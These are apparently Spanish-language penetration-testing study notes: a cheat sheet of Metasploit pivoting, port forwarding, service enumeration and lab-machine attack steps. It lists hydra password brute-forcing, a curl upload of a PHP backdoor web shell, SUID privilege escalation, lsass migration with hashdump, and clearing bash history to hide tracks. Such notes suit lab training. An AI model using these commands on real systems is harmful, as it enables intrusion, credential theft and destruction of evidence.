meterpreter> ipconfig -Verificar las interfaces que tiene (1 loopback, 2 misma que nosotros, 3 subnet interna) o no?
run autoroute -s SubnetVictima1(10.0.29/20 --> Dependiendo de la mascara)
run auotorute -p -Listas la tabla de rutas
background
msf> search portscan/tcp
set RHOST IPVictima2
set PORTS 1-100
exploit

___________PORTFORWARDING

sessions 1
meterpreter> portfwd add -l 1234(Mio) -p 80 -r IPVctima2
# nmap -sVC -p 1234 localhost -Hace un Nmap a mi IP y mi puerto

search BadBlue
set payload windows/metreprete/bind_tcp
set RHOST IPVcitima2
exploit
Se creo una sesion de meterpreter de la Victima2


BORRAR HUELLAS

WINDOWS
meterpreter> resources ruta/a/archivo_Creado al ejecutar el meterpreter/archivo.rc

LINUX
history -c -Borrar el historial de comandos usados en bash
cat /dev/null > .bash_history

_______________________________________________________________________

curl http://Web/uploads/ --upload-file /usr/share/webshells/php/simple-backdoor.php -Carga de archivos en un directory Listing dependiendo de los metodos que acepte ese directorio web







pgrep explorer -Ver el uid del proceso
icacls flag -Verificar permisos
icacls flag /remove:d "NT AUTHORITY\SYSTEM" -Remover restricciones de acceso a archivos
netstat -tuln 127.0.0.1 -Enumerar dispositivos en red

find / -perm -4000 2>/dev/null -Buscar archivos con permisos de SetUID, osea con privilegios de root
find / -exec /bin/rbash -p \; -quit -Elevar privilegios a traves de un shell con todos los permisos (cat /etc/shells | while read shell; do ls -l $shell 2>/dev/null; done)


____________________-

ENUMERACION

ipconfig
nmap -sn IP

ifconfig
nmap -sn IP -Enumerar la red idealmente con cherrytree
nmap -sSVC -p- IP1 -Ir almacenando la informacion

WEB
dirb o dirsearch -u -Enumerar diretorios
wpscan --url http://IP -e u -Enumeracion de usuario Wordpress - Version etc
wpscan --url http://IP/wordpress --password rockyou.txt
whatweb http://IP -Informacion de la web
hydra -l user -P unix_password.txt IP http-post-form '/wordpres/wp-login.php:log=^USER^&pwd=^PASS^:S=302'
- En lo posible hallar el wp-config.php
nmap -p80 -sSVC 

SSH
searchsploit OpenSSH x.x.x
msfconsole> OpenSSH x.x.x
hydra -L unix_users.txt -P unix_password.txt ssh://IP
ssh user@IP
crontab -l -Procesos cron
sudo -l -Ver permisos de ejecucion (Buscar como escalar en internet)
cat /etc/passwd | grep -v "nologin|false" -Ver usuarios existentes

MSQL
hydra -l root(por defecto) -P unix_password.txt mysql://IP -O manualmente con las credenciales por defecto

PIVOTING
ifconfig -Revisar si tiene mas adaptadores de red

___________ MAQUINA 2 - PIVOTING

FTP
nmap -sSCV -p21 --script=ftp-anon IP

SMB
nmaP -sSVC -p445 --script=smb-security-mode, smb-enum-shares, smb-enum-users, smb-enum-sessions IP
smbclient -L -N IP
enum4linux 
crackmapexec smb IP -p '' -u '' --shares
smbmap -H IP -u '' -p ''
hydra -P password.txt -L users.txt smb://IP
msf> smb_login
locate psexec
psexec.py user@IP
msf> search psexec
pgrep lsass
migrate 464
hashdump
shell --> net users -Ver cuantos usuarios hay
getprivs, getuid, getsystem,
whoami /privs 
query user
net localgroup administrators
systeminfo
arp -a -Maquinas en la tabla ARP
meterpreter> ifconfig -Verificar si hay mas interfaces de red, para hacer pivoting
run arp_scanner -r IPSubnet/24
run autoroute -s IPSubred/24 -Agregar la subred
msf> route print
portscan/tcp

PortFowarding
meterpreter> portfwd add -l 2233 -p 445 -r IPVictima2
nmap -p 2233 localhost

____________________ MAQUINA 3

FTP 
nmap -sSVC -p21 IP
hydra

SMTP 
smtp-user-enum

SAMBA
msf> usermap_script

WINRM
msf> winrm_login
